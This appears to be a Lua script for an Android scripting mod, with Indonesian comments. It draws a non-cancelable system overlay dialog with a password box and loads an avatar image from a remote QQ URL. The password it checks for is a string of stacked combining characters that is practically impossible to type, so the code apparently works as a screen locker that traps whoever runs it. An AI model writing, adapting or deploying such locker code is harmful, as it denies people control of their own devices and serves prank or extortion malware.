-- Dijalankan oleh modifikasi ELGG, penulis: Shizuku, unduh ELGG: https://www.xiaoman.top

import "android.app.*"
import "android.os.*"
import "android.widget.*"
import "android.view.*"
import "android.content.*"
import "android.*"
import "android.graphics.drawable.*"
import "android.ext.*"
import "android.graphics.drawable.GradientDrawable"
import "android.graphics.*"
import "android.graphics.drawable.ColorDrawable"
import "android.content.Context"
import "android.media.AudioManager"
import "android.webkit.MimeTypeMap"

context = activity
window = context.getSystemService("window") -- Dapatkan manajer jendela
if Build.VERSION.SDK_INT >= 26 then
    windowtype = 2038
else
    windowtype = 2003
end

function threadStart(runnable)
    local newRun = luajava.createProxy("java.lang.Runnable", runnable)
    local subThread = luajava.newInstance("java.lang.Thread", newRun)
    subThread:start()
    return subThread
end

function getShepeBackground(color, radiu) -- Fungsi atur latar belakang
    drawable = luajava.new(GradientDrawable)
    drawable.setShape(GradientDrawable.RECTANGLE)
    drawable.setColor(color)
    drawable.setCornerRadii({ radiu, radiu, radiu, radiu, radiu, radiu, radiu, radiu })
    return drawable
end

function miaobian(d, r, t, y)
    local InsideColor = Color.parseColor(t)
    local drawable = GradientDrawable()
    drawable.setShape(GradientDrawable.RECTANGLE)
    drawable.setColor(InsideColor)
    drawable.setCornerRadii({ r, r, r, r, r, r, r, r })
    drawable.setStroke(d, Color.parseColor(y))
    return drawable
end

function LoadUi()
    local login = loadlayout({
        LinearLayout,
        layout_width = "fill",
        layout_height = "fill",
        gravity = "center",
        {
            CardView,
            layout_width = "180dp",
            layout_height = "290dp",
            Elevation = '15dp',
            radius = '15',
            CardBackgroundColor = "#FFFFFFFF",
            {
                LinearLayout,
                layout_width = -1,
                layout_height = -1,
                gravity = "center",
                orientation = "vertical",
                {
                    CardView,
                    layout_width = -1,
                    layout_height = "140dp",
                    layout_margin = "20dp",
                    CardBackgroundColor = "#00FFFFFF",
                    radius = '15',
                    {
                        ImageView,
                        layout_width = -1,
                        layout_height = -1,
                        scaleType = "fitCenter",
                        id = "pic",
                    },
                },
                {
                    EditText,
                    layout_width = -1,
                    layout_margin = "5dp",
                    layout_height = "40dp",
                    background = miaobian(3, 20, "#FFF9F9F9", "#FF000000"),
                    textColor = 4278224127,
                    padding = "5dp",
                    inputType = "textPassword", -- Mengatur input sebagai password
                    hint = "Masukkan Password", -- Hint untuk input password
                    id = "edit",
                },
                {
                    TextView,
                    layout_width = -1,
                    layout_margin = "10dp",
                    layout_height = -1,
                    text = "Login",
                    gravity = "center",
                    textSize = "17sp",
                    textColor = 0xFFFFFFFF,
                    background = getShepeBackground(4278224127, 20),
                    onClick = function()
                        local input = edit.getText().toString()
                        if input == "̧̡̡̨̧̻̦̭͕͉̮̤͓̤̣̮̣̰͕̤͓̲͚̝̭̣̺̣̰̞̦͕̖͇̗͈̞̲̙̘̖̞͉̖̠̲̹̠̹̺͈̟̲̝̜͚̖̙͕͕̞͈̗̝͙̩̹͜ͅ" then
                            dlg_create.dismiss()
                            print("Password Benar")
                            luajava.exit()
                        else
                            print("Password Salah")
                        end
                    end,
                },
            },
        },
    })

    threadStart({
        run = function()
            bit1 = loadbitmap("http://q1.qlogo.cn/g?b=qq&nk=2843833170&s=640") -- Memuat avatar default
            activity.runOnUiThread(luajava.createProxy("java.lang.Runnable", {
                run = function()
                    local create_dlg = AlertDialog.Builder(activity)
                    create_dlg.setView(login)
                    create_dlg.setCancelable(false)
                    dlg_create = create_dlg.create()
                    dlg_create.getWindow().setType(windowtype)
                    dlg_create.getWindow().setBackgroundDrawable(ColorDrawable(0x00FFFFFF))
                    dlg_create.show()
                    pic.setImageBitmap(bit1)
                end
            }))
        end
    })
end

Lock.Ui(LoadUi, nil, function(err)
    print(err)
    luajava.exit()
end)

os.exit()
